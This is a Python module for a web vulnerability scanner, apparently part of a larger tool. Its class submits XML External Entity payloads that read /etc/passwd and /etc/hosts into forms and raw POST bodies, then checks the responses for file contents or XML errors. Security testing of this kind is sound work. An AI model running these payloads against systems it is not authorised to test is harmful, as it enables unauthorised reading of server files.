import logging
import re
import textwrap
from urllib.parse import urljoin
from typing import Dict
from core.base_scanner import BaseScanner
from core.utils import RequestUtils

class XXEInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            textwrap.dedent("""\
                <?xml version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                <foo>&xxe;</foo>"""),
            textwrap.dedent("""\
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
                <data>&xxe;</data>""")
        ]

    def scan(self) -> Dict:
        results = []
        response = self.make_request(self.target_url)
        if not response:
            return {'xxe_injection': []}
        
        forms = RequestUtils.extract_forms(response.text)
        for form in forms:
            form_url = urljoin(self.target_url, form['action'] or self.target_url)
            for input_field in form['inputs']:
     
                if input_field['type'].lower() == 'textarea' or 'xml' in input_field['name'].lower():
                    for payload in self.payloads:
                        if self.test_xxe(form_url, form['method'], input_field['name'], payload):
                            results.append({
                                'url': form_url,
                                'method': form['method'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'vulnerability': 'XML External Entity (XXE) Injection',
                                'severity': 'High'
                            })
                            
        for payload in self.payloads:
            if self.test_xxe(self.target_url, 'post', None, payload, direct=True):
                results.append({
                    'url': self.target_url,
                    'method': 'POST',
                    'parameter': 'raw body',
                    'payload': payload,
                    'vulnerability': 'XML External Entity (XXE) Injection',
                    'severity': 'High'
                })

        return {'xxe_injection': results}

    def test_xxe(self, url: str, method: str, param: str, payload: str, direct: bool = False) -> bool:

        headers = {"Content-Type": "application/xml"}
        benign_payload = textwrap.dedent("""\
            <?xml version="1.0"?>
            <foo>test</foo>""")

        try:
            if direct:
                normal_response = self.make_request(
                    url,
                    method="POST",
                    data=benign_payload,
                    headers=headers
                )
                response = self.make_request(
                    url,
                    method="POST",
                    data=payload,
                    headers=headers
                )
            else:
                normal_data = {param: benign_payload}
                normal_response = self.make_request(
                    url,
                    method=method.upper(),
                    data=normal_data if method.lower() == 'post' else None,
                    params=normal_data if method.lower() == 'get' else None,
                    headers=headers if method.lower() == 'post' else None
                )
                data = {param: payload}
                response = self.make_request(
                    url,
                    method=method.upper(),
                    data=data if method.lower() == 'post' else None,
                    params=data if method.lower() == 'get' else None,
                    headers=headers if method.lower() == 'post' else None
                )
            
            if not response or not normal_response:
                return False

            file_signs = ["root:", "daemon:", "bin:"]
            for sign in file_signs:
                if sign in response.text and sign not in normal_response.text:
                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload}")
                    return True

            error_patterns = ["Entity", "DOCTYPE", "XML", "fatal error"]
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE) and not re.search(pattern, normal_response.text, re.IGNORECASE):
                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload} (error pattern match)")
                    return True

            return False
        except Exception as e:
            logging.error(f"Error testing XXE on {url} for parameter '{param}': {e}")
            return False